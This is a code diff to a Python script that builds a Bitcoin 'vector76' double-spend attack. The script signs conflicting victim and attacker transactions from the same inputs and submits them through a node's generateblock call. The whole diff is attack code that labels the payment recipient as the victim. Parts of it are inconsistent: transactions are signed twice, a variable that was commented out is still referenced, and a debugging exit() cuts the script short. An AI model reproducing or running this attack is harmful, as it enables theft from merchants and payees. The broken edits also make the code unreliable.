@@ -158,21 +158,22 @@ fee = 10000
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
-tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
-tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
+tx_victim   = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_victim, fee=fee), fake_send_from)
+tx_attacker = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee), fake_send_from)
 
+vector76    = [tx_victim, tx_attacker]
 tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
+#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
-vector76 = f"{tx_attacker}{tx_victim}"
-vector76_block   = cryptos.serialize(transaction_util.signall(cryptos.deserialize(vector76), fake_send_from))
+#vector76 = transaction_util.mktx_with_change(inputs, cryptos.deserialize(vector76), fee=fee)
+#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
 print("Generating vector76 Block...")
-
-payload = [attacker_address,
-                     [vector76_block]]
+payload = [attacker_address, vector76]
 payload = json.dumps(payload)
-
+print(payload)
+exit()
 data = node.call("generateblock", payload)
 print(data)
 print()
@@ -183,8 +184,7 @@ print("--------------------")
 print(f"Send to                       : {victim_address}")
 print(f"Send Amount   (Satoshi unit)  : {send_amount} Satoshi")
 print(f"Signed victim   Signed RawTx  : {tx_victim}")
-print(f"Signed attacker Signed RawTx  : {tx_attacker}")
-print(f"Signed vector76 Signed RawTx  : {vector76_block}")
+print(f"vector76                      : {vector76_block}")
 print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
